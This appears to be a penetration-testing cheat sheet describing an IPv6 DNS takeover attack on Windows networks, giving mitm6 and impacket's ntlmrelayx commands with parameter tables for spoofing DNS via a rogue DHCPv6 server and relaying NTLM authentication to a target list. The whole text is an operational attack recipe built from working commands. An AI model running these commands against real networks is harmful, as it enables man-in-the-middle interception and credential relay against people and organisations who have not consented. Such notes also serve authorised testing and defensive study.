# When to use

If no protection is enabled for DHCPv6.  
Windows enables IPv6 By default but in a lot of networks no DHCPv6 (or slaac, ...) is configured.  
This allows the use of your own DHCPv6 server to inject your own DNS servers.  
Windows prefers the IPv6 above the IPv4 so you are sure your DNS servers are used.

# Attack  
## MITM

First start the DNS spoofing.  
This can be done with: mitm6  

```
mitm6.py -d $INTERNAL.DOMAIN --ignore-nofqdn
```

| Parameter        | Description           |
| ------------- |:-------------:| 
| d $INTERNAL.DOMAIN  | filter on what domains you want to spoof; $INTERNAL.DOMAIN should be domain that is used by the IPv4 clients | 
| -ignore-nofqdn | ignore DHCPv6 queries without FQDN| 

## ntlmrelayx (part of impacket)

```
ntlmrelayx -tf $file -smb2support -6
```

| Parameter        | Description           |
| ------------- |:-------------:| 
| tf $file  | the file that contains the targets | 
| smb2support  | enbale smb2 | 
| 6  | listen IPv4 & IPv6 | 